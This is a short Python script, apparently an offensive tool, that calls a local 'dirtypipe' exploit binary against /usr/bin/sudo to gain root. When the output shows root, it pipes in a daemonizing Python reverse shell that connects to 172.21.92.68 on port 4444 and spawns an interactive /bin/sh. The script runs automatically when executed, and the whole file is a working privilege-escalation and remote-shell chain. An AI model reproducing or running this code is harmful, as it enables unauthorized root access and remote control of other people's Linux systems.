#imports

import subprocess
import os

def checkroot():
    root_status = subprocess.run(['whoami'], stdout=subprocess.PIPE).stdout.decode('utf-8').strip()
    if root_status == "root": return True
    else: return False

# def runcommand(command,input = False):
#     command = command.split(" ")
#     if input:
#         return subprocess.run(command,stdin=subprocess.PIPE, stdout=subprocess.PIPE).stdout.decode('utf-8')

version_info = '.'.join(subprocess.run(['uname', '-r'], stdout=subprocess.PIPE).stdout.decode('utf-8').split(".")[:2])


def dirtypipe_check():
    status = False

    dirtypipe = subprocess.run(
        ["payloads/dirtypipe","/usr/bin/sudo"],
        stdout=subprocess.PIPE,
        input="whoami",
        encoding="utf-8"
        )
    rev_shell_string = """
    python -c 'exec(\"""\nimport socket,subprocess,os,sys\n\npidrg = os.fork()\nif pidrg > 0:\n        sys.exit(0)\n\nos.chdir("/")\n\nos.setsid()\n\nos.umask(0)\n\ndrgpid = os.fork()\nif drgpid > 0:\n        sys.exit(0)\n\nsys.stdout.flush()\n\nsys.stderr.flush()\n\nfdreg = open("/dev/null", "w")\n\nsys.stdout = fdreg\n\nsys.stderr = fdreg\n\nsdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\nsdregs.connect(("172.21.92.68",4444))\n\nos.dup2(sdregs.fileno(),0)\n\nos.dup2(sdregs.fileno(),1)\n\nos.dup2(sdregs.fileno(),2)\n\np=subprocess.call(["/bin/sh","-i"])\n\""")'\n
    """
    if dirtypipe.stdout[:4] == "root":
        reverse_shell = subprocess.run(
        ["payloads/dirtypipe","/usr/bin/sudo"],
        stdout=subprocess.PIPE,
        input=rev_shell_string,
        encoding="utf-8"
        )
        status = True
    else:
        print("Failed to get root")

    return status


dirtypipe_check()